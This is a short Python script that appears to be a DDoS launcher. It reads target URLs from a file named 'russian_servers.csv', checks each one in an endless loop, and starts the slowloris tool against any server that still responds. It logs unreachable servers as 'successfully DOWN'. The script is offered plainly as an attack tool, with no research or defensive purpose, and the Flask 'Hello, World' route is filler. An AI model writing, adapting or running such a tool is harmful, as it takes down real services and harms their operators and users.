import os
import subprocess
from time import sleep
from flask import Flask
from requests import get
from requests.exceptions import RequestException


app = Flask(__name__)


@app.route("/")
def base():
    return "<p>Hello, World!</p>"

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


def printo(message, *, color=0):
    if color == 0:
        print(bcolors.ENDC, message, bcolors.ENDC)
    elif color == 1:
        print(bcolors.OKGREEN, message, bcolors.OKGREEN)
    elif color == 2:
        print(bcolors.WARNING, message, bcolors.WARNING)
    elif color == 3:
        print(bcolors.FAIL, message, bcolors.FAIL)


if __name__ == '__main__':
    path = os.path.dirname(os.path.abspath(__file__))
    f = open(path + '/russian_servers.csv')
    servers = f.read()
    while True:
        all = 0
        down = 0
        for s in servers.split('\n'):
            all += 1
            printo(f'Connecting to {s}')
            try:
                resp = get(s, timeout=5)
                printo(f'{s} still responding!', color=3)
                printo(f'Commencing an DDoS attack on {s}!', color=2)
                # subprocess.Popen(["slowloris", s])
                os.spawnl(os.P_NOWAIT, f'slowloris', s)
            except RequestException:
                down += 1
                printo(f'{s} successfully DOWN', color=1)

        printo(f'{down} out of {all} are DOWN! ... waiting for 10 seconds...', color=2)
        sleep(10)
